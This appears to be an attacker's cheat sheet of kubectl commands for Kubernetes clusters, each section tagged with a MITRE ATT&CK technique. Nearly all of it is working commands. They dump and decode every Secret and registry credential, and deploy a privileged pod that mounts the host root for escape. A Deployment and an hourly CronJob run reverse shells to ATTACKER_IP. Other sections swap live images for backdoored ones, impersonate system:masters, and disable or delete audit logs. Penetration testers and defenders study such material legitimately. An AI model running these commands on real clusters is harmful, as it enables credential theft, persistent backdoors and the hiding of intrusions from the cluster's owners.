# kubectl — Hands-On Use Cases

## Enumerate nodes and cluster configuration

**MITRE ATT&CK:** T1526 (Cloud Service Discovery)

List all nodes in the cluster, show their IP addresses, and check node readiness:

```bash
kubectl get nodes -o wide
kubectl describe node <NODE_NAME>
```

Enumerate API server, kubelet, and controller-manager versions:

```bash
kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo}'
```

Extract cluster CA certificate (useful for reconstructing full kubeconfig):

```bash
kubectl config view --raw --flatten
```

## Extract Secrets and ConfigMaps

**MITRE ATT&CK:** T1552.007 (Unsecured Credentials in Container), T1578.002 (Modify Cloud Compute Properties)

List all Secrets in a namespace (shows keys but not values by default):

```bash
kubectl get secrets -n <NAMESPACE>
kubectl get secrets -A  # all namespaces
```

Extract a Secret's actual content (decoded):

```bash
kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data.password}' | base64 -d
kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o yaml  # all keys/values, base64-encoded
```

Extract all Secrets from all namespaces and write to a file:

```bash
kubectl get secrets -A -o json > all_secrets.json
cat all_secrets.json | jq '.items[] | select(.type == "Opaque") | .data'
```

Find database credentials in ConfigMaps:

```bash
kubectl get configmap -A -o yaml | grep -i -E 'password|secret|key|token'
```

Extract Docker registry credentials (used for container image pulls):

```bash
kubectl get secret -n <NAMESPACE> --field-selector type=kubernetes.io/dockercfg -o yaml
kubectl get secret -n <NAMESPACE> --field-selector type=kubernetes.io/dockerconfigjson -o yaml
```

## List and inspect running Pods

**MITRE ATT&CK:** T1526 (Cloud Service Discovery), T1580 (Cloud Infrastructure Discovery)

List all Pods across all namespaces with their container images:

```bash
kubectl get pods -A -o wide
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}'
```

Inspect a specific Pod's configuration, looking for misconfigurations:

```bash
kubectl describe pod <POD_NAME> -n <NAMESPACE>
kubectl get pod <POD_NAME> -n <NAMESPACE> -o yaml
```

Find Pods running with high privileges (host networking, privileged containers, etc.):

```bash
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.hostNetwork}{"\t"}{.spec.hostPID}{"\n"}{end}'
kubectl get pods -A -o jsonpath='{range .items[*].spec.containers[*]}{.securityContext.privileged}{"\n"}{end}'
```

## Check RBAC permissions: what can this credential do?

**MITRE ATT&CK:** T1580 (Cloud Infrastructure Discovery), T1526 (Cloud Service Discovery)

Check if current user/ServiceAccount can perform a specific action:

```bash
kubectl auth can-i list pods
kubectl auth can-i get secrets --namespace kube-system
kubectl auth can-i list nodes
kubectl auth can-i create pods
```

If authorization is denied, the output is explicit: `no`. If allowed, the output is: `yes`.

For a comprehensive view, check which verbs are allowed on a given resource:

```bash
kubectl api-resources  # list all available API resources
kubectl get clusterrole -o yaml | grep -A 10 "name: <ROLE_NAME>"
```

## Create a new Pod or Deployment for lateral movement/persistence

**MITRE ATT&CK:** T1610 (Deploy Container)

Create and run a single Pod (interactive shell, useful for quick commands):

```bash
kubectl run -it --image=alpine:latest --restart=Never --rm attacker-pod -- /bin/sh
```

Create a Pod that mounts the host filesystem, breaking out to the node:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
spec:
  containers:
  - name: attacker
    image: alpine:latest
    volumeMounts:
    - name: host-root
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF
```

Then exec into the Pod and access the host filesystem:

```bash
kubectl exec -it privesc-pod -- chroot /host /bin/bash
```

Create a Deployment that spawns multiple attacker Pods across the cluster:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: attacker-deployment
spec:
  replicas: 10
  selector:
    matchLabels:
      app: attacker
  template:
    metadata:
      labels:
        app: attacker
    spec:
      containers:
      - name: payload
        image: attacker-image:latest
        command: ["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"]
EOF
```

## Create a CronJob for persistence

**MITRE ATT&CK:** T1053.006 (Scheduled Task), T1610 (Deploy Container)

Create a CronJob that spawns a reverse shell every hour:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata:
  name: reverse-shell-cron
spec:
  schedule: "0 * * * *"  # Every hour
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: default
          containers:
          - name: attacker
            image: ubuntu:latest
            command: ["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"]
            securityContext:
              privileged: true
          restartPolicy: OnFailure
EOF
```

## Exec into a running Pod

**MITRE ATT&CK:** T1611 (Escape to Host)

Execute a command in a running Pod (like `docker exec`):

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- /bin/bash
kubectl exec <POD_NAME> -n <NAMESPACE> -- whoami
```

## Modify a Deployment to inject malicious container images

**MITRE ATT&CK:** T1578.002 (Modify Cloud Compute Properties), T1610 (Deploy Container)

Edit a running Deployment and change the container image to a backdoored version:

```bash
kubectl set image deployment/<DEPLOYMENT_NAME> <CONTAINER_NAME>=attacker-image:latest -n <NAMESPACE>
kubectl patch deployment <DEPLOYMENT_NAME> -p '{"spec":{"template":{"spec":{"containers":[{"name":"<CONTAINER_NAME>","image":"attacker-image:latest"}]}}}}' -n <NAMESPACE>
```

This triggers a rolling update, spawning new Pods with the malicious image.

## Read ETCD snapshots or backup credentials

**MITRE ATT&CK:** T1530 (Data from Cloud Storage)

If a Pod has access to ETCD backup files or credentials are stored as Secrets, extract them:

```bash
kubectl get secret -n kube-system -o yaml | grep -i etcd
kubectl get secret etcd-backup -n kube-system -o jsonpath='{.data.backup}' | base64 -d > etcd-backup.db
```

## Cross-namespace lateral movement (exploiting overly-permissive Role)

**MITRE ATT&CK:** T1526 (Cloud Service Discovery)

If a ServiceAccount in namespace `A` has a Role that grants access to resources in namespace `B`:

```bash
# From inside namespace A, try to access namespace B's Secrets
kubectl get secrets -n namespace-b
kubectl get pods -n namespace-b
```

This will succeed if the Role binding permits it. Use `kubectl auth can-i` to test first.

## Check for Kubernetes API server exposure

**MITRE ATT&CK:** T1526 (Cloud Service Discovery)

From outside the cluster, attempt to reach the API server (useful if you've discovered the endpoint via OSINT or internal network scan):

```bash
curl -k https://api.example.com:6443/api/v1/namespaces --header "Authorization: Bearer <TOKEN>"
kubectl --server https://api.example.com:6443 --token <TOKEN> get pods
```

## Impersonate another user (if `impersonate` permission is granted)

**MITRE ATT&CK:** T1078.004 (Cloud Accounts)

If the current credential has the `impersonate` verb on users/groups, execute commands as a different user:

```bash
kubectl --as=system:masters get nodes  # Impersonate the masters group (often very permissive)
kubectl --as=system:serviceaccount:kube-system:admin get pods -A
```

## Escalate privilege via default ServiceAccount in kube-system namespace

**MITRE ATT&CK:** T1078.004 (Cloud Accounts), T1526 (Cloud Service Discovery)

Many misconfigured clusters grant the default ServiceAccount in `kube-system` high permissions. If you're in the cluster and can read the default token:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN --server=https://kubernetes.default.svc.cluster.local:443 --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt get nodes
```

## Enumerate RBAC: list all ClusterRoles and who has them

**MITRE ATT&CK:** T1526 (Cloud Service Discovery)

Map the entire RBAC structure to find overly-permissive roles:

```bash
kubectl get clusterrole -o wide
kubectl get clusterrolebinding -o wide
kubectl get role -A
kubectl get rolebinding -A
```

Find roles that grant `*` (all verbs) on resources:

```bash
kubectl get clusterrole -o jsonpath='{range .items[?(@.rules[*].verbs[*]=="*")]}{.metadata.name}{"\n"}{end}'
```

Find ServiceAccounts that are bound to admin-like roles:

```bash
kubectl get clusterrolebinding -o jsonpath='{range .items[?(@.roleRef.name=="cluster-admin")]}{.subjects[*].name}{"\n"}{end}'
```

## Delete audit logs or disable audit logging (requires API server access and cluster-admin)

**MITRE ATT&CK:** T1562.008 (Impair Defenses: Disable or Modify System Logging), T1578.001 (Modify Cloud Compute Properties)

If you've achieved cluster-admin or can modify the API server configuration:

```bash
# Disable audit logging by editing the kube-apiserver pod's audit policy
kubectl edit pod kube-apiserver -n kube-system
# Remove or comment out the audit-policy-file and audit-log-path flags

# Or delete audit log files if they're written to a PersistentVolume
kubectl get pvc -n kube-system
kubectl delete pvc audit-logs -n kube-system
```
